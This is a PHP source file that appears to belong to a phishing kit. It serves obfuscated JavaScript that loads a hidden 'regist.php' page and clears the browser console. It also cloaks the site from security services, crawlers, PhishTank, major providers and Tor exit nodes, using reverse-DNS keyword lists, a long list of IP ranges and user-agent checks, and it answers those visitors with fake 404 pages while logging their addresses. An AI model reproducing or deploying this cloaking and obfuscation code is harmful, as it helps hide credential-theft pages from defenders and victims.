<?php

error_reporting(0);
session_start();
require_once "bow3ll.php";
require_once "conf.php";
require_once "obfuscator.php";
$W3LL = new W3LL(array("active" => true, "bot_redirect" => $FailRedirect, "apikey" => $token));
$W3LL->run();
if (!isset($_SESSION["done"])) {
    $time = time();
    
    $dir = "/var/www/html";
    if (strpos($dir, "gogo") !== false) {
        $jsCode = "var req = new XMLHttpRequest();\n                    if(window.location.hash){\n                    var hash = location.hash.substr(1);\n                    \n                    }\n                    req.open('GET', 'regist.php', false);\n                    req.send(null);\n                    \n                    if(req.status == 200) {\n                    document.write(req.responseText);\n                    }\n                    \n                    function clearConsole() { \n                        if(window.console || window.console.firebug) {\n                        console.clear();\n                        }\n                    }\n                    \n                    clearConsole();";
        $hunter = new HunterObfuscator($jsCode);
        $obsfucated = $hunter->Obfuscate();
    } else {
        $jsCode = "var req = new XMLHttpRequest();\n                    if(window.location.hash){\n                    var hash = location.hash.substr(1);\n                    \n                    }\n                    req.open('GET', 'regist.php', false);\n                    req.send(null);\n                    \n                    if(req.status == 200) {\n                    document.write(req.responseText);\n                    }\n                    \n                    function clearConsole() { \n                        if(window.console || window.console.firebug) {\n                        console.clear();\n                        }\n                    }\n                    \n                    clearConsole();";
        $hunter = new HunterObfuscator($jsCode);
        $obsfucated = $hunter->Obfuscate();
    }
        echo "<html><head><script>" . $obsfucated . "</script></head></html>";
        die;
}

$hosanagi = gethostbyaddr($_SERVER["REMOTE_ADDR"]);
$solanagi = array("gmail", "yandex", "ymail", "yahoo", "icann", "bot", "Robot", "above", "google", "softlayer", "amazonaws", "cyveillance", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "microsoft");
foreach ($solanagi as $dunagi) {
    if (substr_count($hosanagi, $dunagi) > 0) {
        header("Location: " . $FailRedirect);
        $file = fopen("gogo/DeniedIPS.txt", "a");
        fwrite($file, "IP:" . $_SERVER["REMOTE_ADDR"] . " DATE:" . date("D M d, Y g:i a") . " REASON:blocked by limitedarea\n");
        fclose($file);
        chmod("gogo/DeniedIPS.txt", 384);
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
}
$locanagi = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*", "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "54.228.218.117", "^54.228.218.*", "185.28.20.243", "^185.28.20.*", "217.16.26.166", "^217.16.26.*", "^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*", "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^66.211.169.3", "^66.211.169.66", "^89.163.159.214", "^37.128.131.171", "^12.148.196.*", "^193.220.178.*", "^68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^104.108.64.175", "104.83.233.198", "^173.194.116.102", "^173.194.112.*", "^65.55.206.154", "^193.221.113.53", "^208.76.45.53", "^208.84.*.*", "^207.46.8.167", "^65.54.188.110", "^207.46.8.199", "^134.170.2.199", "^65.55.92.152", "^65.54.188.94", "^65.55.37.104", "^65.55.92.168", "^65.55.37.120", "^65.55.33.119", "^65.55.92.184", "^65.54.188.126", "^65.55.37.88", "^65.55.37.88", "^65.55.92.136", "^207.46.8.199", "^65.55.92.168", "^65.54.188.94", "^65.55.33.119", "^65.55.37.104", "^65.54.188.110", "^65.55.37.72", "^65.55.92.152", "^207.46.8.167", "^65.55.33.135", "^134.170.2.199", "^65.55.85.12", "^173.194.116.149", "^216.58.211.37", "^89.163.159.214", "^64.233.*.*", "^66.102.*.*", "^66.249.*.*", "^216.239.*.*", "^216.33.229.163", "^64.233.173.*", "^64.68.90.*");
if (in_array($_SERVER["REMOTE_ADDR"], $locanagi)) {
    header("HTTP/1.0 404 Not Found");
    die;
} else {
    foreach ($locanagi as $ipunagi) {
        if (preg_match("/" . $ipunagi . "/", $_SERVER["REMOTE_ADDR"])) {
            header("HTTP/1.0 404 Not Found");
            $file = fopen("gogo/DeniedIPS.txt", "a");
            fwrite($file, "IP:" . $_SERVER["REMOTE_ADDR"] . " DATE:" . date("D M d, Y g:i a") . " REASON:blocked by limitedarea\n");
            fclose($file);
            chmod("gogo/DeniedIPS.txt", 384);
            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        }
    }
}
if (strpos($_SERVER["HTTP_USER_AGENT"], "google") or strpos($_SERVER["HTTP_USER_AGENT"], "msnbot") or strpos($_SERVER["HTTP_USER_AGENT"], "Yahoo! Slurp") or strpos($_SERVER["HTTP_USER_AGENT"], "YahooSeeker") or strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") or strpos($_SERVER["HTTP_USER_AGENT"], "bingbot") or strpos($_SERVER["HTTP_USER_AGENT"], "crawler") or strpos($_SERVER["HTTP_USER_AGENT"], "PycURL") or strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit") !== false) {
    header("HTTP/1.0 404 Not Found");
    die;
}
if (!empty($_SERVER["HTTP_CLIENT_IP"]) && filter_var($_SERVER["HTTP_CLIENT_IP"], FILTER_VALIDATE_IP)) {
    $ipunagi = $_SERVER["HTTP_CLIENT_IP"];
} else {
    if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"]) && filter_var($_SERVER["HTTP_X_FORWARDED_FOR"], FILTER_VALIDATE_IP)) {
        $ipunagi = $_SERVER["HTTP_X_FORWARDED_FOR"];
    } else {
        if (filter_var($_SERVER["REMOTE_ADDR"], FILTER_VALIDATE_IP)) {
            $ipunagi = $_SERVER["REMOTE_ADDR"];
        }
    }
}
